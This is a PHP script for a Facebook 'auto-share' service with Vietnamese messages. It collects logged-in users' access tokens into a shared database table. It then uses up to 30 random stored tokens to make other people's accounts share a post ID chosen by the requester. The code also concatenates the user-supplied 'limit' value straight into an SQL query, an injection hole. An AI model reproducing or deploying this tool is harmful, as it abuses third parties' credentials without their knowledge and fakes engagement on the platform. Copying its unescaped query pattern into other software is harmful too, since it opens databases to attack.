<?php 
session_start();
include'config.php';

if($_POST['id_share'] && $_SESSION['id']){
mysql_query("CREATE TABLE IF NOT EXISTS `tokenshare` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");

   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         tokenshare
      WHERE
         user_id = '" . mysql_real_escape_string($_SESSION['id']) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 100){
         mysql_query("
            DELETE FROM
               tokenshare
            WHERE
               user_id='" . mysql_real_escape_string($_SESSION['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 
   if(!$row){
      mysql_query(
         "INSERT INTO 
            tokenshare
         SET
            `user_id` = '" . mysql_real_escape_string($_SESSION['id']) . "',
            `name` = '" . mysql_real_escape_string($_SESSION['name']) . "',
            `access_token` = '" . mysql_real_escape_string($_SESSION['token']) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            tokenshare
         SET
            `access_token` = '" . mysql_real_escape_string($_SESSION['token']) . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
   }  

 
$limit=$_POST['limit'];
if ($limit > 30){
   die('<div class="alert alert-danger" style="padding: 12px; border-radius: 1px!important;">F12?</div>');
break;
}
$idstt2=$_POST['id_share'];
$iduser=$_SESSION['id'];
$spam2 = mysql_result(mysql_query("SELECT COUNT(*) FROM `timeshare` WHERE `iduser`='".$iduser."'"), 0);
if($spam2 == 0){
mysql_query("CREATE TABLE IF NOT EXISTS `timeshare` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `iduser` varchar(32) NOT NULL,
      `time` varchar(32) NOT NULL,
      `idshare` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");
   mysql_query(
         "INSERT INTO 
            timeshare
         SET
            `iduser` = '" . mysql_real_escape_string($iduser) . "',
            `time` = '" . time() . "',
            `idshare` = '" . mysql_real_escape_string($idstt2) . "'
      ");
    $laytoken = mysql_query("SELECT * FROM `tokenshare` ORDER BY RAND() LIMIT 0,".$limit);

    while ($getpu = mysql_fetch_array($laytoken)){
        $tokenshare= $getpu['access_token'];        
    auto('https://graph.facebook.com/'.$idstt2.'/sharedposts?access_token='.$tokenshare.'&method=post');}
    die('<div class="alert alert-success" style="padding: 12px; border-radius: 1px!important;">Tăng '.$limit.' Lượt Share Thành Công Vào ID: '.$idstt2.'</div>');
 } else {	die('<div class="alert alert-danger" style="padding: 12px; border-radius: 1px!important;">Không Thành Công! Mỗi Lần Sử Dụng Cách Nhau 15p!</div>'); }
}
function auto($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
?>